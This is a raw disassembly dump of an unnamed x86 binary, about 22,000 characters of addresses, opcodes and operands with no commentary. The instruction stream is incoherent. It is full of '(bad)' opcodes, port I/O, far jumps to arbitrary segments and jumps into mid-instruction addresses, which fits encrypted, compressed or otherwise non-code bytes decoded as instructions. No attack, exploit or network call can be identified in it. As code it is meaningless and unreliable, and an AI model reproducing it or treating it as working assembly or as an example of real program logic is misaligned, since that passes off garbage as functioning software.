  445a9e:	stos   DWORD PTR es:[edi],eax
  445a9f:	or     eax,ecx
  445aa1:	fmul   DWORD PTR [edi]
  445aa3:	in     eax,dx
  445aa4:	xor    eax,0x572f0461
  445aa9:	sub    al,0x43
  445aab:	jno    0x445a77
  445aad:	sbb    esi,ebp
  445aaf:	mov    eax,0x8409f221
  445ab4:	aam    0xd8
  445ab6:	icebp  
  445ab7:	mov    al,ds:0x463bea68
  445abc:	ins    DWORD PTR es:[edi],dx
  445abd:	outs   dx,DWORD PTR ds:[esi]
  445abe:	pop    edi
  445abf:	out    0x5e,eax
  445ac1:	test   al,0xd0
  445ac3:	mov    ah,cl
  445ac5:	and    bl,BYTE PTR [eax]
  445ac7:	jecxz  0x445b33
  445ac9:	pusha  
  445aca:	sbb    eax,esp
  445acc:	clc    
  445acd:	xchg   ebx,eax
  445ace:	xor    eax,0xee92de3a
  445ad3:	sub    eax,edi
  445ad5:	stos   BYTE PTR es:[edi],al
  445ad6:	add    bl,BYTE PTR [ebp+ecx*2+0x4beeecc6]
  445add:	popa   
  445ade:	loop   0x445b5a
  445ae0:	(bad)  
  445ae1:	jmp    0x445a84
  445ae3:	das    
  445ae4:	ja     0x445b0f
  445ae6:	lock sub BYTE PTR [ebx+eax*2],dl
  445aea:	mov    dh,0x60
  445aec:	fcmovu st,st(2)
  445aee:	dec    esp
  445aef:	adc    DWORD PTR [edi],esi
  445af1:	popa   
  445af2:	cmp    BYTE PTR [esi+0xb],cl
  445af5:	jge    0x445b6e
  445af7:	sbb    ebx,ebp
  445af9:	(bad)  
  445afa:	jmp    0x445b70
  445afc:	mov    esi,0xc09361ed
  445b01:	cwde   
  445b02:	inc    esp
  445b03:	mov    cl,0x6b
  445b05:	pusha  
  445b06:	lods   al,BYTE PTR ds:[esi]
  445b07:	mov    ecx,0x981d547e
  445b0c:	test   al,0xbb
  445b0e:	out    dx,al
  445b0f:	lods   eax,DWORD PTR ds:[esi]
  445b10:	outs   dx,DWORD PTR ds:[esi]
  445b11:	test   al,0x5e
  445b13:	(bad)  
  445b14:	cld    
  445b15:	sub    ah,BYTE PTR cs:[ecx+0x2a8997f3]
  445b1c:	and    eax,0x5e8fb170
  445b21:	lods   al,BYTE PTR ds:[esi]
  445b22:	popa   
  445b23:	push   cs
  445b24:	mov    esp,0x6200b099
  445b29:	popa   
  445b2a:	dec    esp
  445b2b:	pop    edi
  445b2c:	std    
  445b2d:	inc    esi
  445b2e:	jne    0x445b49
  445b30:	mov    al,0x1a
  445b32:	out    dx,al
  445b33:	inc    ebx
  445b34:	adc    DWORD PTR [edx+0x5d],0xffffff99
  445b38:	xor    al,0x69
  445b3a:	outs   dx,DWORD PTR ds:[esi]
  445b3b:	sub    DWORD PTR [ecx-0x798a86a0],eax
  445b41:	jo     0x445b75
  445b43:	xchg   esi,eax
  445b44:	adc    BYTE PTR [edi-0x12],dl
  445b47:	aas    
  445b48:	pop    esp
  445b49:	mov    DWORD PTR [ebx],ebp
  445b4b:	mov    eax,gs:0x30a1481f
  445b51:	jmp    0x445bcd
  445b53:	mov    ebp,0x60f0244b
  445b58:	in     al,dx
  445b59:	cs out dx,al
  445b5b:	cmp    DWORD PTR [edi-0x1e],ecx
  445b5e:	test   eax,0xe89811c4
  445b63:	mov    al,ds:0xa27d31bb
  445b68:	adc    eax,0x5ed9153f
  445b6d:	fmul   QWORD PTR [edx-0x22]
  445b70:	dec    ecx
  445b71:	push   0x2
  445b73:	xor    esp,eax
  445b75:	shl    BYTE PTR [edx-0x5f],0x88
  445b79:	sahf   
  445b7a:	xor    al,0x8e
  445b7c:	cmp    al,0xd5
  445b7e:	jns    0x445bbc
  445b80:	pop    esi
  445b81:	dec    ecx
  445b82:	ins    DWORD PTR es:[edi],dx
  445b83:	int    0xbc
  445b85:	push   0x7b
  445b87:	inc    ecx
  445b88:	aam    0x60
  445b8a:	test   al,0xa9
  445b8c:	sar    DWORD PTR [edi*8-0x1165a4b1],0xb5
  445b94:	cmp    DWORD PTR [esi],ebp
  445b96:	lea    esp,[edi-0x5e71425d]
  445b9c:	fsub   st,st(4)
  445b9e:	dec    ebp
  445b9f:	pushf  
  445ba0:	adc    esi,DWORD PTR [ebp+0x355e32ac]
  445ba6:	jae    0x445bc7
  445ba8:	mov    edx,DWORD PTR [edx+0x59eee246]
  445bae:	or     eax,0xa36ba872
  445bb3:	rol    DWORD PTR [esi+0x39],1
  445bb6:	sub    al,0x3f
  445bb8:	pop    esi
  445bb9:	pop    ds
  445bba:	jb     0x445c0b
  445bbc:	xor    DWORD PTR [esi],edx
  445bbe:	xchg   edi,eax
  445bbf:	std    
  445bc0:	jbe    0x445c34
  445bc2:	sbb    bl,BYTE PTR [eax]
  445bc4:	sub    DWORD PTR [ecx-0x51],esp
  445bc7:	jle    0x445c31
  445bc9:	or     DWORD PTR [ebp-0x4999a1ab],eax
  445bcf:	cmc    
  445bd0:	jns    0x445be5
  445bd2:	mov    bl,0x87
  445bd4:	or     al,0x61
  445bd6:	dec    esp
  445bd7:	mov    al,BYTE PTR [edx-0x3c0cace9]
  445bdd:	pushf  
  445bde:	out    dx,al
  445bdf:	aaa    
  445be0:	xor    eax,0x88023d9b
  445be5:	jb     0x445bfc
  445be7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445be8:	sbb    ebx,DWORD PTR [edi+0x5a]
  445beb:	sbb    al,0x8e
  445bed:	xor    BYTE PTR [esi+0x3],ah
  445bf0:	xchg   esp,eax
  445bf1:	mov    gs,esi
  445bf3:	adc    eax,0x7df775c0
  445bf8:	call   0x6e0bf720
  445bfd:	mov    ebx,0xb67ba0c0
  445c02:	es aas 
  445c04:	mov    ecx,0xdd59ee74
  445c09:	rcl    bl,0xa4
  445c0c:	mov    esi,0x48a19296
  445c11:	pop    ds
  445c12:	call   0xa3b7c237
  445c17:	jnp    0x445c76
  445c19:	xor    al,0xbd
  445c1b:	loope  0x445c36
  445c1d:	js     0x445bb7
  445c1f:	and    eax,0xa0ccb896
  445c24:	pop    es
  445c25:	fdiv   DWORD PTR [edi]
  445c27:	dec    ecx
  445c28:	mov    bl,0x99
  445c2a:	or     BYTE PTR [esi+ebx*2-0xb],bh
  445c2e:	or     eax,0xf5a4983b
  445c33:	(bad)  
  445c34:	lock shl BYTE PTR [bp+di-0x72],1
  445c39:	jecxz  0x445bc9
  445c3b:	mov    eax,ds:0xb8372fb1
  445c40:	xor    cl,ah
  445c42:	lods   eax,DWORD PTR ds:[esi]
  445c43:	in     al,0x5e
  445c45:	popf   
  445c46:	cld    
  445c47:	add    BYTE PTR [eax],bl
  445c49:	or     esi,DWORD PTR [esi]
  445c4b:	pop    ss
  445c4c:	xor    ah,BYTE PTR [ecx-0x47]
  445c4f:	arpl   WORD PTR [esi-0x1b],dx
  445c52:	(bad)  
  445c53:	in     al,dx
  445c54:	es xor dh,ch
  445c57:	add    al,BYTE PTR [ebx]
  445c59:	xlat   BYTE PTR ds:[ebx]
  445c5a:	add    cl,BYTE PTR ds:0xa2a3a6cf
  445c60:	fst    QWORD PTR [esp+edx*2+0x2e]
  445c64:	adc    eax,0x79f1fb8a
  445c69:	and    ah,bl
  445c6b:	and    eax,0xbaee6bff
  445c70:	and    eax,0xe2414438
  445c75:	ficom  WORD PTR [edx]
  445c77:	mov    eax,ds:0x628499fe
  445c7c:	into   
  445c7d:	jmp    0xeb0:0xc5e89d3
  445c84:	pop    ecx
  445c85:	add    DWORD PTR [ebp+0x5b647b09],ecx
  445c8b:	xor    BYTE PTR [ebx+0x22],bl
  445c8e:	scas   eax,DWORD PTR es:[edi]
  445c8f:	or     eax,0x986fa853
  445c94:	sahf   
  445c95:	rcr    ah,0xbe
  445c98:	dec    ebx
  445c99:	jnp    0x445c88
  445c9b:	dec    eax
  445c9c:	push   ebp
  445c9d:	pop    ds
  445c9e:	mov    edx,0x3edb37cd
  445ca3:	lds    eax,FWORD PTR [eax]
  445ca5:	pop    edx
  445ca6:	call   0xb9b04c5e
  445cab:	nop
  445cac:	or     al,0xe
  445cae:	mov    ebp,0x920242c7
  445cb3:	scas   eax,DWORD PTR es:[edi]
  445cb4:	pop    esi
  445cb5:	jge    0x445cac
  445cb7:	loope  0x445cee
  445cb9:	gs pop ecx
  445cbb:	in     eax,dx
  445cbc:	nop
  445cbd:	pusha  
  445cbe:	data16 or al,0x89
  445cc1:	jle    0x445d2f
  445cc3:	mov    eax,DWORD PTR [ebp-0x4e]
  445cc6:	es addr16 cs inc edx
  445cca:	aam    0x9
  445ccc:	fidiv  WORD PTR [ecx]
  445cce:	loope  0x445d16
  445cd0:	enter  0x3db2,0xa1
  445cd4:	mov    ch,0xe4
  445cd6:	stos   DWORD PTR es:[edi],eax
  445cd7:	xor    cl,ah
  445cd9:	fwait
  445cda:	pop    ss
  445cdb:	inc    ebp
  445cdc:	pop    esi
  445cdd:	enter  0xfab5,0x26
  445ce1:	jb     0x445c87
  445ce3:	jbe    0x445ca2
  445ce5:	pusha  
  445ce6:	lock and al,0x3d
  445ce9:	dec    eax
  445cea:	jecxz  0x445d0b
  445cec:	inc    esp
  445ced:	ret    0x27ee
  445cf0:	push   eax
  445cf1:	repnz sahf 
  445cf3:	mov    al,0x93
  445cf5:	pop    edi
  445cf6:	mov    edx,0x17b16ba0
  445cfb:	pop    edx
  445cfc:	ins    DWORD PTR es:[edi],dx
  445cfd:	pushf  
  445cfe:	outs   dx,DWORD PTR ds:[esi]
  445cff:	sbb    ebx,DWORD PTR [esi+0x7c]
  445d02:	or     ebp,DWORD PTR [eax-0x1516b0fa]
  445d08:	in     al,0x60
  445d0a:	xor    ch,BYTE PTR [edx+0x7e]
  445d0d:	pop    ds
  445d0e:	pop    ecx
  445d0f:	sub    al,0xe0
  445d11:	mov    edx,0xaa1740ee
  445d16:	push   eax
  445d17:	sahf   
  445d18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445d19:	nop
  445d1a:	pop    ss
  445d1b:	jmp    0xd85bbd5
  445d20:	jne    0x445cea
  445d22:	xchg   DWORD PTR [ebx-0x2],ebp
  445d25:	sub    BYTE PTR [ebp+ebp*8-0x421a70a2],dl
  445d2c:	mov    al,ds:0xeab896ce
  445d31:	or     dx,WORD PTR [ebx+0x76e31cde]
  445d38:	cld    
  445d39:	mov    ecx,0x96861555
  445d3e:	out    dx,al
  445d3f:	add    BYTE PTR [edi-0x1d39ce93],ch
  445d45:	and    DWORD PTR [edx],esi
  445d47:	mov    eax,ds:0x20fda257
  445d4c:	jg     0x445d98
  445d4e:	cpuid  
  445d50:	pop    ebp
  445d51:	shr    BYTE PTR [edi+esi*8+0x24],1
  445d55:	sub    cl,bh
  445d57:	sub    DWORD PTR [ebx],eax
  445d59:	mov    al,0xa1
  445d5b:	jns    0x445cf7
  445d5d:	sbb    ebp,ebp
  445d5f:	xor    dl,BYTE PTR [edi]
  445d61:	es retf 
  445d63:	fwait
  445d64:	push   ecx
  445d65:	lods   eax,DWORD PTR ds:[esi]
  445d66:	inc    esi
  445d67:	test   al,0xaa
  445d69:	pusha  
  445d6a:	test   al,0xf2
  445d6c:	or     BYTE PTR [eax+0x67],bh
  445d6f:	leave  
  445d70:	outs   dx,DWORD PTR ds:[esi]
  445d71:	int3   
  445d72:	add    BYTE PTR [edx+0x64],cl
  445d75:	adc    ebp,DWORD PTR [esi-0x7f]
  445d78:	or     DWORD PTR ds:0x60912f4d,ebx
  445d7e:	sub    ah,BYTE PTR [ebx-0x626e923a]
  445d84:	mov    DWORD PTR [ecx+0x243128ee],ebp
  445d8a:	add    BYTE PTR [eax],0x90
  445d8d:	push   ebx
  445d8e:	enter  0xc9a0,0x41
  445d92:	mov    esp,0x7c19025d
  445d97:	test   BYTE PTR [esi+0x11],bl
  445d9a:	imul   edi,edi,0x8cd3876c
  445da0:	xchg   esp,eax
  445da1:	sub    eax,0x814daad6
  445da6:	outs   dx,BYTE PTR ds:[esi]
  445da7:	push   es
  445da8:	push   esi
  445da9:	cwde   
  445daa:	inc    esi
  445dab:	mov    ebp,0x79fff1b3
  445db0:	pop    ebx
  445db1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445db2:	outs   dx,BYTE PTR ds:[esi]
  445db3:	arpl   WORD PTR [esi],si
  445db5:	rcr    BYTE PTR [ebp+0x54268ab8],0xa1
  445dbc:	inc    esp
  445dbd:	aaa    
  445dbe:	in     al,dx
  445dbf:	adc    DWORD PTR [edx-0x3],eax
  445dc2:	shr    BYTE PTR [esi+ebx*2],1
  445dc5:	sti    
  445dc6:	cmc    
  445dc7:	sahf   
  445dc8:	and    edx,edi
  445dca:	mov    DWORD PTR [eax-0x38],ebx
  445dcd:	pop    edi
  445dce:	(bad)  
  445dcf:	call   0x5277db28
  445dd4:	sar    BYTE PTR [ebp+ebp*4+0xfa95f88],cl
  445ddb:	out    0x1,eax
  445ddd:	dec    esp
  445dde:	dec    esi
  445ddf:	inc    ecx
  445de0:	sbb    DWORD PTR [ecx+eax*8+0x738f4a0],0x5bb6f5b1
  445deb:	outs   dx,BYTE PTR ds:[esi]
  445dec:	aaa    
  445ded:	loope  0x445d89
  445def:	das    
  445df0:	je     0x445e52
  445df2:	das    
  445df3:	cli    
  445df4:	shr    BYTE PTR [edx-0x56c0f386],cl
  445dfa:	fldenv [eax+0x65de9327]
  445e00:	mov    ecx,0x26cc4ef4
  445e05:	jnp    0x445dad
  445e07:	mov    eax,ds:0x67cbafbc
  445e0c:	repz inc edi
  445e0e:	inc    ebx
  445e0f:	mov    eax,ds:0xcde8d19e
  445e14:	jp     0x445e27
  445e16:	or     eax,0x138e5e6e
  445e1b:	rcl    cl,0x30
  445e1e:	jl     0x445e4f
  445e20:	inc    edx
  445e21:	popa   
  445e22:	or     eax,DWORD PTR [ebx]
  445e24:	mov    bl,BYTE PTR [edx-0x7b]
  445e27:	sti    
  445e28:	cmp    eax,0x8038eeb3
  445e2d:	jno    0x445de0
  445e2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445e30:	mul    BYTE PTR [esi+0x60ba2914]
  445e36:	mov    ds:0x34a0447,eax
  445e3b:	pop    ecx
  445e3c:	repnz and edi,ebp
  445e3f:	jg     0x445e88
  445e41:	push   ss
  445e42:	cwde   
  445e43:	and    al,0xb1
  445e45:	fwait
  445e46:	cmp    DWORD PTR [ecx+0x55],edx
  445e49:	sbb    esi,DWORD PTR [ecx]
  445e4b:	jg     0x445de7
  445e4d:	pusha  
  445e4e:	(bad)  
  445e4f:	sar    BYTE PTR [esi],0x78
  445e52:	xor    BYTE PTR [ecx+0x2c],dl
  445e55:	cli    
  445e56:	fmul   DWORD PTR [ebx-0xc9f1da2]
  445e5c:	inc    eax
  445e5d:	out    dx,eax
  445e5e:	fucom  st(4)
  445e60:	(bad)  [ebx]
  445e62:	jb     0x445df2
  445e64:	add    esi,DWORD PTR ds:[eax+eiz*2-0x79fe6b19]
  445e6c:	arpl   di,si
  445e6e:	xlat   BYTE PTR ds:[ebx]
  445e6f:	loopne 0x445ecf
  445e71:	inc    esi
  445e72:	mov    edx,0xf2ee8b39
  445e77:	outs   dx,BYTE PTR ds:[esi]
  445e78:	push   ss
  445e79:	popa   
  445e7a:	mov    bh,0xaa
  445e7c:	(bad)  
  445e7d:	mov    eax,0x8509cbe8
  445e82:	push   eax
  445e83:	and    al,0x5f
  445e85:	cmc    
  445e86:	data16 aam 0x88
  445e89:	out    0xea,al
  445e8b:	js     0x445e65
  445e8d:	dec    eax
  445e8e:	aas    
  445e8f:	mov    eax,ds:0xefa549a7
  445e94:	loop   0x445ed5
  445e96:	jp     0x445e92
  445e98:	ss add ch,ch
  445e9b:	pmullw mm5,QWORD PTR ds:0x1a23ea2e
  445ea2:	fistp  WORD PTR [edi+0x61]
  445ea6:	shl    DWORD PTR es:[edi-0x1e],0x6f
  445eab:	loop   0x445ef6
  445ead:	xchg   ecx,eax
  445eae:	out    dx,al
  445eaf:	sub    edi,ebx
  445eb1:	repnz addr16 pusha 
  445eb4:	push   esi
  445eb5:	in     al,dx
  445eb6:	mov    ecx,0x3f60faf2
  445ebb:	repnz pushf 
  445ebd:	jmp    0xb44aa147
  445ec2:	in     al,dx
  445ec3:	btc    DWORD PTR [ecx-0x41d3d5de],ebx
  445eca:	leave  
  445ecb:	or     BYTE PTR [edx-0x80],dl
  445ece:	test   BYTE PTR [ebx-0x6a0ad7db],ah
  445ed4:	rol    BYTE PTR [eax-0x52],1
  445ed7:	pop    esi
  445ed8:	out    dx,al
  445ed9:	(bad)  
  445eda:	out    dx,al
  445edb:	lods   eax,DWORD PTR ds:[esi]
  445edc:	dec    ebp
  445edd:	jg     0x445f30
  445edf:	fstp   st(2)
  445ee1:	out    dx,al
  445ee2:	shl    DWORD PTR [eax-0x2e417b11],cl
  445ee8:	sbb    edx,DWORD PTR [eax-0x5ba13f70]
  445eee:	sub    bl,BYTE PTR [ebx+0x7884e11e]
  445ef4:	and    bl,BYTE PTR cs:[ecx-0x5f]
  445ef8:	ja     0x445ee0
  445efa:	push   edx
  445efb:	enter  0xf0f,0x3a
  445eff:	loop   0x445f5f
  445f01:	add    BYTE PTR [edx+eiz*2+0x21],cl
  445f05:	shl    DWORD PTR [ebp-0xc9ed128],cl
  445f0b:	jmp    0xed2:0x2dbaaffb
  445f12:	repz fsubrp st(0),st
  445f15:	xchg   ecx,eax
  445f16:	scas   eax,DWORD PTR es:[edi]
  445f17:	mov    al,ds:0xbb56594a
  445f1c:	shl    eax,1
  445f1e:	sub    al,0xa1
  445f20:	retf   0xaefb
  445f23:	and    eax,0x1d87166f
  445f28:	pop    esi
  445f29:	and    eax,0x576067ab
  445f2e:	std    
  445f2f:	adc    eax,DWORD PTR [esi+0x5e]
  445f32:	xor    DWORD PTR [eax+0xb],edi
  445f35:	xor    BYTE PTR [esi-0xabf39c8],bl
  445f3b:	mov    cl,0xf3
  445f3d:	into   
  445f3e:	out    dx,al
  445f3f:	or     DWORD PTR [ecx],0x49
  445f42:	test   al,0x8c
  445f44:	retf   
  445f45:	mov    dl,BYTE PTR [eax]
  445f47:	mov    eax,ds:0xe14dcfdb
  445f4c:	popa   
  445f4d:	mov    edx,0x715e2744
  445f52:	aam    0x49
  445f54:	outs   dx,DWORD PTR ds:[esi]
  445f55:	out    0x2c,al
  445f57:	loop   0x445f48
  445f59:	pusha  
  445f5a:	scas   eax,DWORD PTR es:[edi]
  445f5b:	jge    0x445f56
  445f5d:	imul   esp,DWORD PTR [ebx-0x59c21234],0x28645ee0
  445f67:	push   esi
  445f68:	test   al,0xc5
  445f6a:	mov    eax,0x576167fe
  445f6f:	cmp    al,0x1b
  445f71:	dec    edi
  445f72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445f73:	sbb    bl,BYTE PTR [edx+esi*4+0x21]
  445f77:	enter  0xa249,0xeb
  445f7b:	ror    DWORD PTR ds:0xf0f22db2,0x5b
  445f83:	ret    0x60bf
  445f86:	mov    eax,0x8917fd29
  445f8b:	scas   eax,DWORD PTR es:[edi]
  445f8c:	jb     0x445fd1
  445f8e:	out    dx,al
  445f8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445f90:	cmp    al,0x6
  445f92:	sub    ecx,0xa105455f
  445f98:	stos   DWORD PTR es:[edi],eax
  445f99:	not    DWORD PTR es:[ecx+0x25]
  445f9d:	(bad)  
  445f9e:	stc    
  445f9f:	inc    ebp
  445fa0:	pop    esi
  445fa1:	mov    ds:0xfbbe6f7f,al
  445fa7:	mov    WORD PTR [ecx-0x21e8db9e],ds
  445fad:	mov    BYTE PTR [edx-0xe],bh
  445fb0:	(bad)  
  445fb1:	xor    edi,esi
  445fb3:	dec    esi
  445fb4:	pop    esi
  445fb5:	xchg   ch,dl
  445fb7:	ins    DWORD PTR es:[edi],dx
  445fb8:	or     BYTE PTR [eax+0x6e],0xe0
  445fbc:	cwde   
  445fbd:	pusha  
  445fbe:	mov    edx,0x3953dcbf
  445fc3:	repz mov dh,0x3e
  445fc6:	in     al,dx
  445fc7:	jnp    0x44603b
  445fc9:	or     BYTE PTR [ebp-0x23f7079],dl
  445fcf:	out    0xcc,al
  445fd1:	pusha  
  445fd2:	inc    edx
  445fd3:	(bad)  
  445fd4:	cmc    
  445fd5:	push   edx
  445fd6:	enter  0xaee7,0xec
  445fda:	out    dx,al
  445fdb:	dec    esi
  445fdc:	lock (bad) 
  445fde:	jle    0x446053
  445fe0:	mov    ch,BYTE PTR [ebp-0x55]
  445fe3:	mov    ds:0x457cb407,al
  445fe8:	xchg   esi,eax
  445fe9:	xor    ebp,DWORD PTR [ecx+esi*8]
  445fec:	push   ds
  445fed:	sub    al,0x10
  445fef:	fnstenv [edi]
  445ff1:	xor    dl,BYTE PTR [edx-0x2c3383df]
  445ff7:	ret    
  445ff8:	pop    edx
  445ff9:	add    esp,DWORD PTR [eax-0x62c1865f]
  445fff:	sbb    BYTE PTR [eax-0xc660991],dh
  446005:	mov    ds:0x6524eff2,al
  44600a:	loopne 0x446022
  44600c:	mov    eax,0x3c5f5c5e
  446011:	pusha  
  446012:	out    0xe,eax
  446014:	sahf   
  446015:	mov    eax,0x9963dddb
  44601a:	cmp    DWORD PTR [esp+eiz*2+0x21],esp
  44601e:	imul   eax,DWORD PTR [ecx],0xa1386da5
  446024:	call   0xedaeecc3
  446029:	call   0x2aa33fcf
  44602e:	dec    esi
  44602f:	xchg   edx,eax
  446030:	sbb    ebx,DWORD PTR [ecx+0x44f29f6c]
  446036:	es push ebx
  446038:	repz mov al,ds:0xb467bec
  44603e:	mov    cs,ebp
  446040:	xor    eax,0x198de96c
  446045:	fsubr  QWORD PTR [esi-0x97ac1a3]
  44604b:	vaesenc xmm7,xmm3,XMMWORD PTR [edx-0x63d2a222]
  446054:	xor    ebx,DWORD PTR [edi]
  446056:	mov    esp,0xad985e07
  44605b:	por    mm3,mm2
  44605e:	sar    DWORD PTR [edi],0x83
  446061:	pusha  
  446062:	inc    ecx
  446063:	adc    DWORD PTR [edx],ecx
  446065:	repz shr BYTE PTR [esi-0x10db4fee],0x3f
  44606d:	pusha  
  44606e:	mov    al,ds:0xbfa77985
  446073:	addr16 cs enter 0x8f15,0x1c
  446079:	or     ebp,DWORD PTR [edi]
  44607b:	loope  0x44601c
  44607d:	aad    0x59
  44607f:	inc    ebx
  446080:	mov    ebx,0x5e784808
  446085:	lods   eax,DWORD PTR ds:[esi]
  446086:	out    0x7e,al
  446088:	sub    DWORD PTR [ebp+0x18],eax
  44608b:	pop    edi
  44608c:	cmp    ah,BYTE PTR [edi]
  44608e:	and    DWORD PTR [ecx-0x2ff780c5],esp
  446094:	ins    BYTE PTR es:[edi],dx
  446095:	enter  0x6faa,0x5e
  446099:	mov    ch,0x1e
  44609b:	nop
  44609c:	div    DWORD PTR [ebx-0x7f]
  44609f:	cld    
  4460a0:	aad    0x60
  4460a2:	jle    0x4460f5
  4460a4:	mov    ecx,0x5b45236e
  4460a9:	aaa    
  4460aa:	out    dx,al
  4460ab:	and    ebx,DWORD PTR [ecx]
  4460ad:	idiv   esp
  4460af:	push   DWORD PTR [ebx]
  4460b1:	(bad)  
  4460b2:	sbb    al,bh
  4460b4:	mov    DWORD PTR [edi+ebp*1-0x28],eax
  4460b8:	fisub  WORD PTR [eax]
  4460ba:	add    al,0x3a
  4460bc:	addr16 mov ebx,edx
  4460bf:	sti    
  4460c0:	pop    esi
  4460c1:	pop    esi
  4460c2:	pop    ecx
  4460c3:	popf   
  4460c4:	jne    0x44609d
  4460c6:	add    ebp,DWORD PTR [ebx+0x49fb6816]
  4460cc:	outs   dx,BYTE PTR ds:[esi]
  4460cd:	popa   
  4460ce:	xor    BYTE PTR [ebp+0xf5b755e],cl
  4460d4:	jmp    0x51ed:0x5e26acb7
  4460db:	fdiv   QWORD PTR [eax]
  4460dd:	pop    es
  4460de:	call   0x8ea4d5a7
  4460e3:	add    al,0xf1
  4460e5:	jne    0x446166
  4460e7:	cmp    al,0x3e
  4460e9:	(bad)  
  4460ea:	out    dx,al
  4460eb:	jmp    FWORD PTR [edx+0x55423012]
  4460f1:	cld    
  4460f2:	stos   DWORD PTR es:[edi],eax
  4460f3:	sahf   
  4460f4:	lea    esi,[edi]
  4460f6:	sub    BYTE PTR [edi-0x6e8db122],ch
  4460fc:	bound  edx,QWORD PTR [esi-0x12]
  4460ff:	push   cs
  446100:	sub    al,0xbc
  446102:	(bad)  
  446103:	enter  0xfa6c,0xcf
  446107:	mov    WORD PTR [ecx+0x76094f46],gs
  44610d:	push   es
  44610e:	jne    0x44618e
  446110:	pop    esi
  446111:	pop    ds
  446112:	jg     0x446096
  446114:	das    
  446115:	add    edi,DWORD PTR [eax+0x5c612d4a]
  44611b:	repz aaa 
  44611d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44611e:	int    0xb9
  446120:	loopne 0x4460c2
  446122:	dec    eax
  446123:	call   0xb28b:0x2ee9975e
  44612a:	ja     0x4460f6
  44612c:	stc    
  44612d:	pusha  
  44612e:	adc    bh,dh
  446130:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446131:	aas    
  446132:	inc    edi
  446133:	cwde   
  446134:	sbb    ebp,DWORD PTR [esi+ebp*8-0x4d8be712]
  44613b:	push   edi
  44613c:	sbb    DWORD PTR [ecx+0x7f45905e],esp
  446142:	aam    0x65
  446144:	(bad)  
  446145:	mov    esp,0xc1a7a18f
  44614a:	pop    ss
  44614b:	xor    DWORD PTR [esi+0x45],edi
  44614e:	out    dx,al
  44614f:	or     DWORD PTR [edx+0x3fce9008],0x18
  446156:	mov    al,0x8
  446158:	out    dx,eax
  446159:	es sbb eax,0x5378aaa1
  44615f:	sub    eax,0x2fb622df
  446164:	out    dx,eax
  446165:	test   esi,esp
  446167:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  446168:	xor    ah,BYTE PTR [ebx-0x39265e80]
  44616e:	push   esp
  44616f:	push   esi
  446170:	xor    cl,BYTE PTR [eax]
  446172:	jl     0x446113
  446174:	dec    esi
  446175:	dec    edi
  446176:	fisubr DWORD PTR [edx]
  446178:	mov    esi,0xd50f6448
  44617d:	mov    edx,0xc422f2ee
  446182:	jge    0x446138
  446184:	cmp    DWORD PTR [ebp+0x39],0xffffff90
  446188:	lds    ebx,FWORD PTR [ebx]
  44618a:	push   ecx
  44618b:	and    esi,esp
  44618d:	jae    0x4461c0
  44618f:	push   0x5202b647
  446194:	fiadd  WORD PTR [ebx+0x5a5758ed]
  44619a:	mov    ds:0x855b8232,al
  44619f:	jnp    0x44616b
  4461a1:	pusha  
  4461a2:	dec    esi
  4461a3:	retf   0xe7eb
  4461a6:	cli    
  4461a7:	and    ebx,DWORD PTR [ecx-0x391211fc]
  4461ad:	mov    al,0xe5
  4461af:	dec    ebx
  4461b0:	fisubr DWORD PTR [eax*2-0x4616b15f]
  4461b7:	imul   edx,ecx,0xffffffd9
  4461ba:	adc    ah,dh
  4461bc:	pop    edi
  4461bd:	pop    es
  4461be:	enter  0xbcd4,0x67
  4461c2:	sub    eax,0x703d5551
  4461c7:	mov    eax,ds:0x73f8b373
  4461cc:	js     0x4461af
  4461ce:	or     eax,0xe91712a0
  4461d3:	stos   BYTE PTR es:[edi],al
  4461d4:	xchg   ebp,eax
  4461d5:	loopne 0x4461d7
  4461d7:	out    0xb8,al
  4461d9:	or     al,0xfc
  4461db:	shr    eax,1
  4461dd:	pusha  
  4461de:	or     ebx,DWORD PTR [edx-0x7f3facd7]
  4461e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4461e5:	shr    esi,cl
  4461e7:	fwait
  4461e8:	xchg   ecx,eax
  4461e9:	adc    ebx,ebp
  4461eb:	cmp    BYTE PTR [eax+0x1e],dl
  4461ee:	bound  edi,QWORD PTR [edi-0x5274b591]
  4461f4:	shl    DWORD PTR [edi],cl
  4461f6:	fisub  WORD PTR [eax+0xec06ec4]
  4461fc:	addr16 mov eax,0xef5ec79e
  446202:	jecxz  0x4461b4
  446204:	cmp    ah,BYTE PTR [eiz*8-0xdd94b38]
  44620b:	mov    al,ds:0xafc1f59b
  446210:	das    
  446211:	cmp    eax,DWORD PTR [esi-0x4e40b95e]
  446217:	push   eax
  446218:	fs mov dl,0x16
  44621b:	dec    DWORD PTR [ecx]
  44621d:	das    
  44621e:	out    dx,al
  44621f:	icebp  
  446220:	dec    ecx
  446221:	fbld   TBYTE PTR [edi-0x4f9f36c7]
  446227:	adc    DWORD PTR [esi],ebx
  446229:	sub    DWORD PTR [ecx],esp
  44622b:	and    DWORD PTR [edx],esi
  44622d:	dec    edi
  44622e:	out    dx,al
  44622f:	data16 jns 0x446242
  446232:	rcr    BYTE PTR [esi+0x4],0x42
  446236:	sub    eax,0xd7f75ca1
  44623b:	call   0xd55e:0xed297515
  446242:	cmp    al,BYTE PTR [edx-0x7]
  446245:	mov    al,ds:0x60dde03f
  44624a:	mov    cl,0x8e
  44624c:	pop    edi
  44624d:	push   eax
  44624e:	cmp    al,0xcf
  446250:	ud0    esp,edi
  446253:	sub    ax,0x54e1
  446257:	repz into 
  446259:	(bad)  
  44625a:	iret   
  44625b:	(bad)  
  44625c:	push   edx
  44625d:	popa   
  44625e:	or     esi,DWORD PTR [ecx+eax*8+0x2d]
  446262:	pushf  
  446263:	loopne 0x4462dc
  446265:	int    0x10
  446267:	add    al,0x50
  446269:	cmc    
  44626a:	out    dx,al
  44626b:	data16 loopne 0x4462e0
  44626e:	xchg   ebp,eax
  44626f:	fcomp  QWORD PTR [edx+0x60]
  446272:	xchg   DWORD PTR [ebx-0xe39a17c],esi
  446278:	pop    ecx
  446279:	xor    DWORD PTR [eax+0x0],edi
  44627c:	pop    esi
